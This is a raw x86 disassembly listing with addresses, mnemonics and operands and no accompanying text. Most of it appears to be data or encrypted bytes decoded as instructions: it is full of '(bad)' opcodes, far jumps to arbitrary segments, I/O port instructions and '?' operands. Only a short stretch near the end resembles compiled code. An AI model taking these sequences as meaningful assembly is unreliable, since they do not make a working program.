  413405:	mov    ebx,0xa056febd
  41340a:	into   
  41340b:	lahf   
  41340c:	int    0xb6
  41340e:	pop    ecx
  41340f:	jmp    0xbe7b:0x877c8847
  413416:	or     BYTE PTR [esi+0x66],ah
  413419:	add    DWORD PTR [edi],0xffffffb6
  41341c:	call   0xc3ee6aed
  413421:	adc    edi,ebp
  413423:	aaa    
  413424:	push   0xffffffcf
  413426:	js     0x4133d5
  413428:	jge    0x41347d
  41342a:	pop    ecx
  41342b:	in     eax,dx
  41342c:	shr    ebp,cl
  41342e:	aam    0xd9
  413430:	mov    ds:0xfccdab6,eax
  413435:	sub    eax,0xbe18a613
  41343a:	xchg   dh,bl
  41343c:	inc    ebx
  41343d:	out    dx,eax
  41343e:	addr16 dec ecx
  413440:	pusha  
  413441:	sbb    ch,BYTE PTR [edx]
  413443:	int3   
  413444:	dec    ebx
  413446:	inc    ecx
  413447:	xor    al,0x93
  41344a:	mov    BYTE PTR [eax+0x3c],ch
  41344d:	jp     0x413457
  41344f:	jmp    0xd43b:0xb0f67919
  413456:	stc    
  413457:	ret    
  413458:	stc    
  413459:	out    dx,eax
  41345a:	scas   eax,DWORD PTR es:[edi]
  41345b:	cmp    BYTE PTR [ebx],al
  41345d:	sub    DWORD PTR [edx+0x6d],0x961004df
  413464:	lods   al,BYTE PTR ds:[esi]
  413465:	add    ebx,ecx
  413467:	in     eax,0x58
  413469:	push   0x3b
  41346b:	fcomip st,st(5)
  41346e:	push   ebx
  41346f:	sub    BYTE PTR [edi+0x308ada8],bh
  413475:	arpl   di,ax
  413477:	adc    DWORD PTR [esi+0x64],esp
  41347a:	aad    0xfa
  41347c:	ins    BYTE PTR es:[edi],dx
  41347d:	imul   esp,DWORD PTR [eax],0xb6b0916c
  413483:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413484:	loopne 0x413439
  413486:	xor    bl,BYTE PTR [ebp+0x7c]
  413489:	clc    
  41348a:	xchg   esp,eax
  41348b:	adc    dh,BYTE PTR [eax+0x6a07d7eb]
  413491:	push   ds
  413492:	jns    0x4134ac
  413494:	arpl   WORD PTR [edx+0x72ff8223],bx
  41349a:	test   DWORD PTR [esi-0x70],esp
  41349d:	add    BYTE PTR [esi+ebx*1],0xf3
  4134a1:	arpl   WORD PTR [ebp-0x25],di
  4134a4:	jne    0x41347c
  4134a6:	xor    eax,0xbe19c8ec
  4134ab:	mov    esp,0xa57a5266
  4134b0:	push   es
  4134b1:	or     BYTE PTR [ebp-0xf],dh
  4134b4:	ds xchg esi,eax
  4134b6:	pop    ebp
  4134b7:	in     eax,0x27
  4134b9:	and    DWORD PTR [ecx+0xa],ebp
  4134bc:	cdq    
  4134bd:	loopne 0x413454
  4134bf:	repnz dec ecx
  4134c1:	mov    dh,0x9
  4134c3:	add    al,0x8a
  4134c5:	push   0xc5f5dc9e
  4134ca:	out    dx,al
  4134cb:	inc    esi
  4134cc:	mov    eax,ds:0xab99a990
  4134d1:	xchg   ecx,eax
  4134d2:	and    BYTE PTR [ebx+0x2d0b9737],dh
  4134d8:	dec    ecx
  4134d9:	call   0x75ac:0x6c3e72ef
  4134e0:	and    DWORD PTR [eax-0x2d133de6],0xa5b74ba7
  4134ea:	fwait
  4134eb:	jb     0x41351f
  4134ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134ee:	and    eax,0xb1c61087
  4134f3:	xchg   ebx,eax
  4134f4:	fnstcw WORD PTR [ebx+0x6c2ae689]
  4134fa:	sbb    bl,BYTE PTR [ecx+ebp*2-0x59ecf692]
  413501:	repnz mov eax,ds:0xfbe7f975
  413507:	cld    
  413508:	mov    ds:0x84b41de6,ax
  41350e:	inc    ebx
  41350f:	add    DWORD PTR [edi+0x631570f],esi
  413515:	neg    esi
  413517:	(bad)  
  413518:	ror    DWORD PTR [eax],1
  41351a:	leave  
  41351b:	out    0x94,eax
  41351d:	mov    ebp,DWORD PTR [ebp+0x85e8b7b]
  413523:	stos   BYTE PTR es:[edi],al
  413524:	xor    BYTE PTR [ebx-0x4b4012e1],ah
  41352a:	add    DWORD PTR [edx+ebx*2+0x41],esp
  41352e:	or     DWORD PTR [edx],0x39b9b7e1
  413534:	in     eax,0x81
  413536:	fwait
  413537:	add    DWORD PTR cs:[ecx-0x2b],edx
  41353b:	push   ebx
  41353c:	jmp    0x4134df
  41353e:	leave  
  41353f:	jb     0x41351e
  413541:	ret    0x2b98
  413544:	in     eax,dx
  413545:	jns    0x4135c6
  413547:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413548:	pop    ebx
  413549:	mov    bl,0x73
  41354b:	scas   eax,DWORD PTR es:[edi]
  41354c:	mov    edi,0xdf0ba7e7
  413551:	pop    es
  413552:	mov    ebx,0x579c7507
  413557:	stc    
  413558:	out    0x68,al
  41355a:	dec    ebp
  41355b:	cmp    al,0xfb
  41355d:	lods   eax,DWORD PTR ds:[esi]
  41355e:	dec    edx
  41355f:	cs (bad) 
  413563:	mov    esp,0x1031134c
  413568:	jle    0x4135d7
  41356a:	mov    ebx,0xab9991a8
  41356f:	or     al,BYTE PTR [edi-0x69e8a885]
  413575:	outs   dx,DWORD PTR ds:[esi]
  413576:	ins    DWORD PTR es:[edi],dx
  413577:	lock xor ebp,ebp
  41357a:	sbb    DWORD PTR ds:0xbfac632e,0x1f
  413581:	fst    st(1)
  413583:	inc    ebx
  413584:	mov    ah,0x72
  413586:	sbb    eax,0xfa243a41
  41358b:	rcr    al,0x7e
  41358e:	adc    DWORD PTR [esi],edi
  413590:	mov    ?,edi
  413592:	cmp    DWORD PTR [eax-0x19],esp
  413595:	mov    dl,bl
  413597:	inc    ecx
  413598:	addr16 pusha 
  41359a:	enter  0xb0b,0x3b
  41359e:	sbb    DWORD PTR [esp],esp
  4135a1:	cwde   
  4135a2:	clc    
  4135a3:	loopne 0x413589
  4135a5:	adc    eax,0xb2e14dc4
  4135aa:	lods   al,BYTE PTR ds:[esi]
  4135ab:	out    0x72,al
  4135ad:	popa   
  4135ae:	(bad)  
  4135af:	fs test ax,0x7434
  4135b4:	out    0x52,eax
  4135b6:	cmc    
  4135b7:	daa    
  4135b8:	inc    ebp
  4135b9:	mov    esp,0x53f76035
  4135be:	sub    DWORD PTR [ebx-0x200408c1],esp
  4135c4:	mov    ah,0x82
  4135c6:	push   eax
  4135c7:	ins    DWORD PTR es:[edi],dx
  4135c8:	cmp    edx,DWORD PTR ss:[edi+0x10b40f3d]
  4135cf:	push   esp
  4135d1:	mov    cl,0xc8
  4135d3:	add    al,0x52
  4135d5:	inc    ebx
  4135d6:	lds    esi,FWORD PTR [edi+0x283f6878]
  4135dc:	sbb    ebp,ecx
  4135de:	xchg   esp,eax
  4135df:	bound  edi,QWORD PTR [edi+0x378d5528]
  4135e5:	lods   eax,DWORD PTR ds:[esi]
  4135e6:	and    BYTE PTR [edi-0x26],0x99
  4135ea:	std    
  4135eb:	mov    bh,0xfd
  4135ed:	sub    dh,ah
  4135ef:	adc    al,0xbd
  4135f1:	aas    
  4135f2:	retf   
  4135f3:	test   al,0x88
  4135f5:	loop   0x413667
  4135f7:	add    al,0x10
  4135f9:	and    eax,0xfa523791
  4135fe:	mov    bh,0xe8
  413600:	pop    eax
  413601:	mov    esp,0x30afb811
  413606:	push   ss
  413607:	loop   0x413642
  413609:	xchg   edx,eax
  41360a:	int    0xaf
  41360c:	data16 cmc 
  41360e:	mov    DWORD PTR [ecx+0x3207ca8e],edi
  413614:	ins    DWORD PTR es:[edi],dx
  413615:	pop    edx
  413616:	(bad)  
  413617:	jmp    0x5b30:0xf3111401
  41361e:	popf   
  41361f:	cdq    
  413620:	jmp    DWORD PTR ds:0x5a5f8e62
  413626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413627:	push   es
  413628:	loop   0x41363c
  41362a:	pop    es
  41362b:	rol    DWORD PTR [edi],1
  41362d:	sub    DWORD PTR [edi-0x6d],ebx
  413630:	add    ah,0x77
  413633:	stos   BYTE PTR es:[edi],al
  413634:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  413636:	add    edx,DWORD PTR [esi+eax*4+0x458b224f]
  41363d:	mov    eax,0xfbc4d8b
  413642:	lods   al,BYTE PTR ds:[esi]
  413643:	enter  0xc102,0xe9
  413647:	add    cl,BYTE PTR [ebx+0x558bb84d]
  41364d:	mov    esp,0x85e9c733
  413652:	add    eax,0xd7b0000
  413657:	les    edi,FWORD PTR [ebx+0x4c78b338]
  41365d:	jle    0x413689
  41365f:	nop
  413660:	outs   dx,BYTE PTR ds:[esi]
  413661:	push   ss
  413662:	mov    ebx,0xfcddb4eb
  413667:	or     al,0x16
  413669:	cmp    eax,0xd8161604
  41366e:	mov    ds:0xc7f4e5b2,eax
  413673:	xor    DWORD PTR [eax+ecx*1],esp
  413676:	mov    al,ds:0x6bd9372
  41367b:	lock in al,0x47
  41367e:	or     ah,BYTE PTR [eax+0x77f5b0f9]
  413684:	or     eax,0x982f3401
  413689:	adc    edx,ebx
  41368b:	inc    ebp
  41368c:	jb     0x41369c
  41368e:	mov    cl,0x87
  413690:	bound  esp,QWORD PTR [ecx]
  413692:	push   esi
  413693:	outs   dx,BYTE PTR ds:[esi]
  413694:	lock mov ds,WORD PTR [edi]
  413697:	scas   eax,DWORD PTR es:[edi]
  413698:	xchg   esp,eax
  413699:	push   edx
  41369a:	(bad)  [eax+0x8]
  41369d:	or     DWORD PTR [esi+0x7a61e1ab],ecx
  4136a3:	(bad)  
  4136a4:	jmp    0x6de6:0x829cb830
  4136ab:	mov    ?,WORD PTR [ebx]
  4136ad:	jg     0x413634
  4136af:	xchg   DWORD PTR [esi-0x704e1e5f],esi
  4136b5:	pop    ebx
  4136b6:	sbb    edx,ecx
  4136b8:	sbb    al,0x7f
  4136ba:	clc    
  4136bb:	in     eax,0xff
  4136bd:	lea    edx,[esp+eax*1+0x5fa4ef8d]
  4136c4:	mov    ch,0xd6
  4136c6:	adc    esi,0x79
  4136c9:	mov    esp,0x3756346b
  4136ce:	shl    DWORD PTR [ebp+0x4bf929cf],cl
  4136d4:	sbb    edi,ebx
  4136d6:	xor    BYTE PTR [ecx-0x61052dcf],ch
  4136dc:	push   0x2a
  4136de:	pop    ecx
  4136df:	int3   
  4136e0:	jmp    0x90e3ecd3
  4136e5:	ins    BYTE PTR es:[edi],dx
  4136e6:	mov    dh,0xc6
  4136e8:	scas   al,BYTE PTR es:[edi]
  4136e9:	push   edi
  4136ea:	cdq    
  4136eb:	(bad)  
  4136ec:	fsubr  DWORD PTR [ebx]
  4136ee:	jp     0x413674
  4136f0:	pop    ss
  4136f1:	or     DWORD PTR [edi+0x9],0x60
  4136f5:	push   esi
  4136f6:	cwde   
  4136f7:	mov    eax,0x9244b744
  4136fc:	mov    cs,WORD PTR [esi+0x77]
  4136ff:	(bad)  
  413700:	jmp    0x6ecfe24f
  413705:	in     al,dx
  413706:	and    al,0xcb
  413708:	inc    edx
  413709:	and    DWORD PTR [eax+0xe],esp
  41370c:	lds    ecx,FWORD PTR [edi]
  41370e:	xchg   edi,eax
  41370f:	mov    ebp,0x479527fc
  413714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413715:	mov    bh,0x74
  413717:	pop    ebp
  413718:	xor    DWORD PTR [ebp-0x7c],ebx
  41371b:	jecxz  0x413796
  41371d:	arpl   WORD PTR [edx-0x37],dx
  413720:	add    dh,bh
  413722:	pop    ebx
  413723:	jns    0x41376b
  413725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413726:	lock out dx,eax
  413728:	pop    esp
  413729:	rcl    BYTE PTR [ecx],0xa4
  41372c:	arpl   bx,ax
  41372e:	test   BYTE PTR [eax],bh
  413730:	je     0x413755
  413732:	pop    ecx
  413733:	or     DWORD PTR [esi+0x5a2c62eb],esi
  413739:	cmp    DWORD PTR [ebx],esi
  41373b:	aas    
  41373c:	or     DWORD PTR [ecx+edx*4-0x699026bf],ebx
  413743:	cs xchg ebx,eax
  413745:	aaa    
  413746:	sub    BYTE PTR [edi-0x9fc4a75],bl
  41374c:	sbb    BYTE PTR [eax],0x6b
  41374f:	ins    BYTE PTR es:[edi],dx
  413750:	dec    edi
  413751:	push   0x43
  413753:	das    
  413754:	pop    ss
  413755:	out    0xce,al
  413757:	sub    BYTE PTR [ecx+0x5257c009],dh
  41375d:	jnp    0x413756
  41375f:	xlat   BYTE PTR ds:[ebx]
  413760:	sbb    DWORD PTR [ecx],ebx
  413762:	fdivr  QWORD PTR [ecx-0x34cf366d]
  413768:	xor    ch,BYTE PTR [eax]
  41376a:	cmp    bl,dl
  41376c:	mov    eax,ds:0x73eac882
  413771:	inc    ebp
  413772:	jne    0x41372d
  413774:	ja     0x413771
  413776:	mov    ds:0x659f489d,eax
  41377b:	dec    ecx
  41377c:	xchg   ecx,eax
  41377d:	cmc    
  41377e:	shl    BYTE PTR [edx+0x9],0xa4
  413782:	jl     0x4137da
  413784:	dec    esp
  413785:	in     al,0x26
  413787:	sub    DWORD PTR [edx-0x536b862b],0x1c8b268c
  413791:	out    dx,eax
  413792:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413793:	(bad)  
  413794:	push   es
  413795:	jne    0x413748
  413797:	pushf  
  413798:	xchg   ebx,eax
  413799:	test   eax,0x99ac84b3
  41379e:	push   ebx
  41379f:	in     eax,0x24
  4137a1:	xchg   DWORD PTR [edi+0x42],edi
  4137a4:	dec    ecx
  4137a5:	jns    0x41381e
  4137a7:	rcl    DWORD PTR [eax-0x20fce928],1
  4137ad:	les    ebx,FWORD PTR [ebx+0x2565510b]
  4137b3:	jge    0x4137fb
  4137b5:	retf   0x1298
  4137b8:	xchg   ebp,eax
  4137b9:	jns    0x41375c
  4137bb:	scas   eax,DWORD PTR es:[edi]
  4137bc:	into   
  4137bd:	(bad)  
  4137be:	jecxz  0x4137b8
  4137c0:	mov    cl,0x8e
  4137c2:	adc    esi,DWORD PTR [edi]
  4137c4:	retf   0x5d77
  4137c7:	jne    0x4137ba
  4137c9:	das    
  4137ca:	mov    esp,0xdaa86254
  4137cf:	sub    eax,0x50d4920c
  4137d4:	xchg   esp,eax
  4137d5:	outs   dx,BYTE PTR ds:[esi]
  4137d6:	jl     0x41379f
  4137d8:	out    dx,al
  4137d9:	(bad)  
  4137da:	ja     0x41380d
  4137dc:	or     bh,BYTE PTR [edi+ebp*2+0x70c43b3f]
  4137e3:	push   edx
  4137e4:	mov    ebp,0x2103424c
  4137e9:	mov    esp,0xc1f3f6ce
  4137ee:	sub    al,0x9
  4137f0:	es sub al,bl
  4137f3:	jmp    0x13e7:0x4d5dfbf9
  4137fa:	in     al,dx
  4137fb:	jmp    0x41385d
  4137fd:	into   
  4137fe:	and    eax,0xd77365c5
  413803:	repz dec esi
  413805:	pop    edi
  413806:	or     BYTE PTR ds:0x614187f3,bl
  41380c:	sar    BYTE PTR [eax+ecx*8+0x3d],cl
  413810:	test   BYTE PTR [esi],0xea
  413813:	pop    edi
  413814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413815:	fsubr  DWORD PTR [ebx]
  413817:	je     0x41388d
  413819:	retf   0xcedc
  41381c:	call   0xa9a5:0x89b7a25a
  413823:	dec    ecx
  413824:	call   0xcdf1fb69
  413829:	dec    edi
  41382a:	cwde   
  41382b:	es ins DWORD PTR es:[edi],dx
  41382d:	stos   DWORD PTR es:[edi],eax
  41382e:	xchg   ebp,eax
  41382f:	sar    DWORD PTR [ebx-0x3bce800c],cl
  413835:	jmp    0xeee949de
  41383a:	bound  esp,QWORD PTR [ebx-0x241e7681]
  413840:	push   edx
  413841:	test   al,0x5c
  413843:	jp     0x413888
  413845:	(bad)  
  413846:	and    BYTE PTR [edi],bl
  413848:	mov    bl,0x3f
  41384a:	aam    0xbf
  41384c:	adc    eax,0xf634d5fa
  413851:	test   eax,0xf85f0a21
  413856:	pop    edi
  413857:	add    DWORD PTR [eax-0x7e],edx
  41385a:	fsubrp st(1),st
  41385c:	xchg   ebp,eax
  41385d:	jns    0x413847
  41385f:	push   ecx
  413860:	sbb    al,0x58
  413862:	add    ch,BYTE PTR [esp+ebx*4+0x9]
  413866:	adc    BYTE PTR ds:0x2acfb149,0x9a
  41386d:	adc    ecx,DWORD PTR [edx+0x5a95ebc9]
  413873:	in     al,dx
  413874:	fistp  DWORD PTR [esi-0x5d6f2278]
  41387a:	mov    eax,0x4ef4c0f9
  41387f:	pop    esi
  413880:	mov    al,0xd2
  413882:	ret    0x3398
  413885:	cmp    DWORD PTR [edi+eax*1-0x33],0xb0c90f9c
  41388d:	je     0x41381e
  41388f:	mov    edi,0x79761d1c
  413894:	in     eax,dx
  413895:	lahf   
  413896:	mov    ebp,0x8b506008
  41389b:	outs   dx,DWORD PTR ds:[esi]
  41389c:	cmp    DWORD PTR [edx+0x1e],0x12cc7fe9
  4138a3:	mov    al,ds:0x792051ff
  4138a8:	inc    ebx
  4138a9:	xor    edx,esi
  4138ab:	cmp    al,0x77
  4138ad:	sar    BYTE PTR ds:0x4e78392f,cl
  4138b3:	or     al,0x2a
  4138b5:	call   0x972d51eb
  4138ba:	out    dx,eax
  4138bb:	fadd   DWORD PTR [ebx+ecx*1+0x2c]
  4138bf:	call   0x501eaf4e
  4138c4:	scas   al,BYTE PTR es:[edi]
  4138c5:	adc    BYTE PTR [eax],cl
  4138c7:	add    DWORD PTR [ebp+edi*4-0x19],edi
  4138cb:	dec    edi
  4138cc:	mov    ebp,0x6507fc9b
  4138d1:	cwde   
  4138d2:	inc    ebx
  4138d3:	gs adc al,0x85
  4138d6:	stc    
  4138d7:	mul    BYTE PTR [ecx+0x59]
  4138da:	add    BYTE PTR ds:0x5a39875f,bl
  4138e0:	pop    es
  4138e1:	push   cs
  4138e2:	mov    al,0x7e
  4138e4:	dec    ecx
  4138e5:	mov    esi,0xf26b7a87
  4138ea:	cmp    dh,BYTE PTR [edi]
  4138ec:	fist   WORD PTR [edi+0x254ff193]
  4138f2:	(bad)  
  4138f3:	adc    eax,0xbf0ef343
  4138f8:	xor    ah,ah
  4138fa:	sub    eax,0x760c5e8d
  4138ff:	loopne 0x413959
  413901:	cdq    
  413902:	out    dx,eax
  413903:	fistp  DWORD PTR [eax+0x1d07a916]
  413909:	inc    edx
  41390a:	push   ebp
  41390b:	mov    eax,ds:0x722f8f0
  413910:	fsub   QWORD PTR [eax+0x3ea846e7]
  413916:	add    eax,0xea2edcc3
  41391b:	xor    bl,al
  41391d:	jae    0x413941
  41391f:	sub    DWORD PTR [ebx+ecx*4+0x72],esi
  413923:	pop    es
  413924:	add    BYTE PTR [eax],bl
  413926:	mov    edi,0x213eed23
  41392b:	xlat   BYTE PTR ds:[ebx]
  41392c:	cld    
  41392d:	mov    ds:0xe2520b7e,al
  413932:	(bad)  [edx+0x2c]
  413935:	test   bh,dl
  413937:	and    ebx,ebx
  413939:	ror    BYTE PTR [esi],0x3e
  41393c:	or     ecx,DWORD PTR [edx+edi*8]
  41393f:	mov    ds:0x6a31f0f3,al
  413944:	or     eax,0x5d267149
  413949:	and    al,0x52
  41394b:	hlt    
  41394c:	mov    al,0xa8
  41394e:	sahf   
  41394f:	loopne 0x413981
  413951:	es push 0xffffffda
  413954:	xor    DWORD PTR [eax-0x5001f5a],esp
  41395a:	pop    ss
  41395b:	or     bh,dl
  41395d:	inc    ebx
  41395e:	cwde   
  41395f:	out    0xd5,al
  413961:	fadd   DWORD PTR [ebx+0x7eda2630]
  413967:	daa    
  413968:	jmp    0x9be18e3c
  41396d:	sbb    ecx,DWORD PTR [ebp-0x1ea11d8c]
  413973:	rol    DWORD PTR [edx],cl
  413975:	cld    
  413976:	cs aas 
  413978:	retf   
  413979:	nop
  41397a:	cmp    edx,DWORD PTR [ebp+eiz*8+0x7d579b9c]
  413981:	pop    es
  413982:	pop    ecx
  413983:	stos   DWORD PTR es:[edi],eax
  413984:	add    eax,0x83da4164
  413989:	cmp    BYTE PTR gs:[esi+0x79864c4b],dl
  413990:	out    dx,eax
  413991:	das    
  413992:	pop    DWORD PTR [ebp-0x5dd44454]
  413998:	sti    
  413999:	out    dx,al
  41399a:	lahf   
  41399b:	mov    bh,0xb6
  41399d:	xchg   BYTE PTR [eax],al
  41399f:	lahf   
  4139a0:	cli    
  4139a1:	jnp    0x413a17
  4139a3:	mov    al,ds:0xe6185bba
  4139a8:	lahf   
  4139a9:	jmp    0x413953
  4139ab:	pop    ebx
  4139ac:	cmp    ah,cl
  4139ae:	retf   0x7c58
  4139b1:	cmp    BYTE PTR [ecx],ch
  4139b3:	mov    al,BYTE PTR [ebx]
  4139b5:	stos   DWORD PTR es:[edi],eax
  4139b6:	pop    ebp
  4139b7:	mov    al,ds:0xad66f64e
  4139bc:	mov    BYTE PTR [edx-0x5c],dl
  4139bf:	out    dx,eax
  4139c0:	pusha  
  4139c1:	aas    
  4139c2:	pop    eax
  4139c3:	repz adc eax,0x4cdbbb31
  4139c9:	adc    bh,0x75
  4139cc:	dec    edi
  4139cd:	push   esi
  4139ce:	ds sbb ah,0x3f
  4139d2:	mov    ecx,0x7af29ed5
  4139d7:	push   edi
  4139d8:	rcr    al,cl
  4139da:	inc    eax
  4139db:	sbb    esi,0x52
  4139de:	stos   DWORD PTR es:[edi],eax
  4139df:	jg     0x4139f0
  4139e1:	push   ecx
  4139e2:	adc    BYTE PTR [edx-0x22],ah
  4139e5:	and    BYTE PTR [ebx+0x4cf81d1],0xc
  4139ec:	mov    WORD PTR [eax+0x38],fs
  4139ef:	xchg   ebx,eax
  4139f0:	enter  0xc05,0x3d
  4139f4:	add    al,BYTE PTR [esi]
  4139f6:	jns    0x413a0c
  4139f8:	add    bh,ch
  4139fa:	in     eax,dx
  4139fb:	icebp  
  4139fc:	mov    es,WORD PTR [eax+0x18b217c7]
  413a02:	cmp    edx,DWORD PTR [esi-0x711014bf]
  413a08:	push   0xffffffdb
  413a0a:	stc    
  413a0b:	std    
  413a0c:	cmp    ah,BYTE PTR [edx-0xb]
  413a0f:	retf   
  413a10:	inc    ecx
  413a11:	fwait
  413a12:	rcr    DWORD PTR [edx-0x2109d07c],cl
  413a18:	cwde   
  413a19:	ret    0xe1cd
  413a1c:	pop    esi
  413a1d:	push   0xee89fe46
  413a22:	pop    ebx
  413a23:	(bad)  
  413a24:	sub    DWORD PTR [edx+0x30f116b2],0xffffffad
  413a2b:	pop    ebp
  413a2c:	sahf   
  413a2d:	jmp    0xb5667384
  413a32:	jmp    0x413aad
  413a34:	int    0xa4
  413a36:	fcomp  QWORD PTR [edx-0xc337ca3]
  413a3c:	mov    BYTE PTR [edx+0x64],al
  413a3f:	pop    ebp
  413a40:	(bad)
  413a44:	jb     0x413a0f
  413a46:	mov    WORD PTR [esi+0x5b],es
  413a49:	jp     0x413a44
  413a4b:	push   edi
  413a4c:	ins    DWORD PTR es:[edi],dx
  413a4d:	or     DWORD PTR [edi+edx*1+0x5b39f8f0],eax
  413a54:	xor    DWORD PTR [eax+0x20],ebx
  413a57:	or     BYTE PTR [ebp-0x149ef5f5],dh
  413a5d:	sbb    eax,0x44278b4c
  413a62:	inc    esi
  413a63:	ins    BYTE PTR es:[edi],dx
  413a64:	lods   al,BYTE PTR ds:[esi]
  413a65:	rcr    BYTE PTR [edx+eiz*8],1
  413a68:	(bad)  
  413a69:	enter  0x19fa,0xcb
  413a6d:	xlat   BYTE PTR ds:[ebx]
  413a6e:	jns    0x413aec
  413a70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a71:	fs push esi
  413a73:	retf   
  413a74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a75:	inc    esp
  413a76:	xchg   ecx,eax
  413a77:	sbb    DWORD PTR [ebp-0x1972569a],ebx
  413a7d:	ret    
  413a7e:	jecxz  0x413ae7
  413a80:	jge    0x413a1e
  413a82:	mov    esi,0x28fcb527
  413a87:	sub    dh,0xc0
  413a8a:	or     DWORD PTR [ebx-0x62e8a921],0xc8d96670
  413a94:	retf   
  413a95:	(bad)  
  413a96:	xchg   edi,eax
  413a97:	mov    dh,0x99
  413a99:	stc    
  413a9a:	jle    0x413a67
  413a9c:	popa   
  413a9d:	aam    0x3
  413a9f:	pop    eax
  413aa0:	mov    ecx,0x1218a556
  413aa5:	arpl   WORD PTR [esi-0x60],sp
  413aa8:	es out 0xc8,al
  413aab:	data16 not BYTE PTR [edi+esi*2-0x424c8123]
  413ab3:	mov    eax,ss:0x34454c1
  413ab9:	call   0x2c5:0xc8216f3
  413ac0:	add    ch,BYTE PTR [ecx]
  413ac2:	call   0x11a92b38
  413ac7:	push   ecx
  413ac8:	movups xmm0,XMMWORD PTR [ebx+ebp*8-0x51a07e]
  413ad0:	lahf   
  413ad1:	inc    esi
  413ad2:	mov    edi,DWORD PTR [ebx+ebx*1-0x4f]
  413ad6:	stos   BYTE PTR es:[edi],al
  413ad7:	in     eax,0x7f
  413ad9:	mov    edx,0xe8ed306b
  413ade:	lods   al,BYTE PTR ds:[esi]
  413adf:	xlat   BYTE PTR ds:[ebx]
  413ae0:	adc    BYTE PTR [ebx],ah
  413ae2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ae3:	out    0xd0,al
  413ae5:	mov    ds:0xffcaa89f,eax
  413aea:	jecxz  0x413a80
  413aec:	rcl    BYTE PTR [ebx-0x7ab35c84],1
  413af2:	sbb    ch,ah
  413af4:	adc    DWORD PTR [ebx-0x37779928],ebp
  413afa:	arpl   WORD PTR [eax],bp
  413afc:	add    BYTE PTR [ebx+0x5d],ah
  413aff:	shl    DWORD PTR [ebp-0x59e9f0d6],1
  413b05:	jne    0x413abb
  413b07:	call   FWORD PTR [esi+0x18]
  413b0a:	or     bh,BYTE PTR [edx+0x150c4b3a]
  413b10:	fcom   QWORD PTR [esi-0x29f8989d]
  413b16:	mov    esp,0x99ac5cd0
  413b1b:	hlt    
  413b1c:	(bad)  
  413b1d:	mov    bl,0x2f
  413b1f:	call   0x947:0x6e2d049
  413b26:	xor    DWORD PTR [edx],edi
  413b28:	dec    esp
  413b29:	sub    al,0x93
  413b2b:	in     eax,dx
  413b2c:	icebp  
  413b2d:	jns    0x413adf
  413b2f:	xchg   esp,eax
  413b30:	aas    
  413b31:	pop    ds
  413b32:	scas   eax,DWORD PTR es:[edi]
  413b33:	sbb    al,0xfc
  413b35:	and    dh,dl
  413b37:	mov    ebp,0xec30a4eb
  413b3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b3d:	dec    ebp
  413b3e:	sbb    al,0xcd
  413b40:	push   edi
  413b41:	test   BYTE PTR [esi+0x4f076621],dh
  413b47:	pop    es
  413b48:	mov    ch,al
  413b4a:	imul   edx,ebx,0xe57452a2
  413b50:	daa    
  413b51:	aad    0x3f
  413b53:	arpl   WORD PTR [edi],dx
  413b55:	sbb    ebp,ebp
  413b57:	xor    DWORD PTR [edi-0x20],edx
  413b5a:	clc    
  413b5b:	mov    dl,0xc4
  413b5d:	fucom  st(7)
  413b5f:	imul   esp,DWORD PTR [ebx],0x9e6c467e
  413b65:	(bad)  
  413b67:	mov    ds:0x5055a2d8,eax
  413b6c:	cli    
  413b6d:	iret   
  413b6e:	sbb    DWORD PTR [ecx],esp
  413b70:	sub    BYTE PTR [edi-0x5e8590e7],0xd4
  413b77:	dec    ecx
  413b78:	outs   dx,BYTE PTR ds:[esi]
  413b79:	repz adc eax,0x8aca0fb8
  413b7f:	mov    eax,0x9c3d0f51
  413b84:	popa   
  413b85:	pop    ds
  413b86:	(bad)  
  413b87:	adc    ebx,ebp
  413b89:	xchg   esp,eax
  413b8a:	adc    dl,BYTE PTR [edx]
  413b8c:	pushf  
  413b8d:	and    BYTE PTR [edx-0x70e8ae82],ah
  413b93:	jne    0x413ba3
  413b95:	popa   
  413b96:	push   ebp
  413b97:	imul   ebx,DWORD PTR [ecx+0x6a42609e],0xdd689d3f
  413ba1:	inc    edi
  413ba2:	sub    eax,0x38175955
  413ba7:	pop    ebx
  413ba8:	dec    esi
  413ba9:	sub    eax,0x1ca9294a
  413bae:	shl    DWORD PTR [ecx-0x3bc7beee],1
  413bb4:	mov    DWORD PTR [eax+esi*8],0xb5522002
  413bbb:	int3   
  413bbc:	push   es
  413bbd:	test   al,0x2f
  413bbf:	addr16 inc ecx
  413bc1:	nop
  413bc2:	lds    esp,FWORD PTR [ebx-0x19f19314]
  413bc8:	dec    ebp
  413bc9:	or     eax,0xbe69d413
  413bce:	sub    eax,0x976a86f3
  413bd3:	arpl   WORD PTR [edi],dx
  413bd5:	push   esp
  413bd6:	cmp    bh,ch
  413bd8:	adc    al,0x98
  413bda:	shl    ecx,0x1e
  413bdd:	xor    edx,edx
  413bdf:	or     eax,edx
  413be1:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  413be5:	mov    eax,DWORD PTR [ebp+0x14]
  413be8:	add    BYTE PTR [eax],cl
  413bea:	mov    eax,DWORD PTR [ebp-0x38]
  413bed:	mov    ecx,DWORD PTR [ebp-0x34]
  413bf0:	shrd   eax,ecx,0x2
  413bf4:	shr    ecx,0x2
  413bf7:	mov    ecx,DWORD PTR [ebp-0x38]
  413bfa:	mov    edx,DWORD PTR [ebp-0x34]
  413bfd:	xor    eax,edi
  413bff:	shl    ecx,0x1e
  413c02:	mov    ecx,DWORD PTR [ebp-0x38]
  413c05:	jmp    0x41418f
  413c0a:	sahf   
  413c0b:	(bad)  
  413c0c:	push   cs
  413c0d:	sub    esi,ebp
  413c0f:	sbb    BYTE PTR [eax],bl
  413c11:	inc    eax
  413c12:	adc    al,0xc8
  413c14:	sub    BYTE PTR [esi-0x4bd35d7a],0xb
  413c1b:	repnz or al,0x16
  413c1e:	cmp    eax,0x98161604
  413c23:	test   edi,edx
